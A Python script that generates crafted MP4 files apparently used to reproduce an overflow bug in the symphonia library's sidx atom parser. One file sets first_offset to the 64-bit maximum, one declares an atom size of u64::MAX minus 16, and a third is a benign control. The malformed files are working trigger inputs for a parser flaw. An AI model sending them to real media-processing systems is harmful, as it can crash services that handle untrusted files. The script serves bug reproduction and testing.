#!/usr/bin/env python3
"""Generates the two crafted MP4 assets used by this reproduction.

Both files consist of a normal `ftyp` atom followed by a single `sidx` (Segment Index) atom with
zero references - the smallest structurally-valid shape that reaches
`SidxAtom::read` (symphonia-format-isomp4/src/atoms/sidx.rs).

  sidx_v1_first_offset_max.mp4
      A version-1 `sidx` whose 64-bit `first_offset` field is 0xFFFF_FFFF_FFFF_FFFF. The atom
      itself is ordinary (40 bytes, declared size matches the real file size), so the file is
      accepted by any seekable-stream bounds check.

  sidx_v0_unknown_len.mp4
      A version-0 `sidx` that uses the 64-bit ("large") atom size form to declare a size of
      u64::MAX - 16, which is exactly the largest value `AtomHeader::read`'s own
      `atom_len > u64::MAX - atom_pos` guard permits at atom position 16. `first_offset` here is
      only 1 (a 32-bit field in version 0). Reached with an unseekable stream, where the atom
      iterator has no container length to bound the declared atom size against.
"""

import struct
import sys
from pathlib import Path


def atom(kind: bytes, payload: bytes) -> bytes:
    return struct.pack(">I", 8 + len(payload)) + kind + payload


def large_atom(kind: bytes, size: int, payload: bytes) -> bytes:
    return struct.pack(">I", 1) + kind + struct.pack(">Q", size) + payload


FTYP = atom(b"ftyp", b"isom" + struct.pack(">I", 0x200))


def sidx_v1_payload(first_offset: int) -> bytes:
    return (
        bytes([1, 0, 0, 0])                 # version = 1, flags = 0
        + struct.pack(">I", 1)              # reference_id
        + struct.pack(">I", 1000)           # timescale (must be non-zero)
        + struct.pack(">Q", 0)              # earliest_presentation_time
        + struct.pack(">Q", first_offset)   # first_offset
        + struct.pack(">H", 0)              # reserved
        + struct.pack(">H", 0)              # reference_count = 0
    )


def sidx_v0_payload(first_offset: int) -> bytes:
    return (
        bytes([0, 0, 0, 0])                 # version = 0, flags = 0
        + struct.pack(">I", 1)              # reference_id
        + struct.pack(">I", 1000)           # timescale
        + struct.pack(">I", 0)              # earliest_presentation_time
        + struct.pack(">I", first_offset)   # first_offset
        + struct.pack(">H", 0)              # reserved
        + struct.pack(">H", 0)              # reference_count = 0
    )


def main() -> None:
    out = Path(sys.argv[1] if len(sys.argv) > 1 else "assets")
    out.mkdir(parents=True, exist_ok=True)

    (out / "sidx_v1_first_offset_max.mp4").write_bytes(
        FTYP + atom(b"sidx", sidx_v1_payload(0xFFFF_FFFF_FFFF_FFFF))
    )

    # atom_pos of the sidx is len(FTYP) == 16, so u64::MAX - 16 is the largest declared size that
    # passes AtomHeader::read's own end-position-overflow guard, making the anchor exactly u64::MAX.
    (out / "sidx_v0_unknown_len.mp4").write_bytes(
        FTYP + large_atom(b"sidx", (1 << 64) - 1 - 16, sidx_v0_payload(1))
    )

    # Control: identical to the first file, but with a plausible first_offset.
    (out / "sidx_v1_ok.mp4").write_bytes(FTYP + atom(b"sidx", sidx_v1_payload(0)))

    for p in sorted(out.iterdir()):
        print(f"{p.name}: {p.stat().st_size} bytes")


if __name__ == "__main__":
    main()
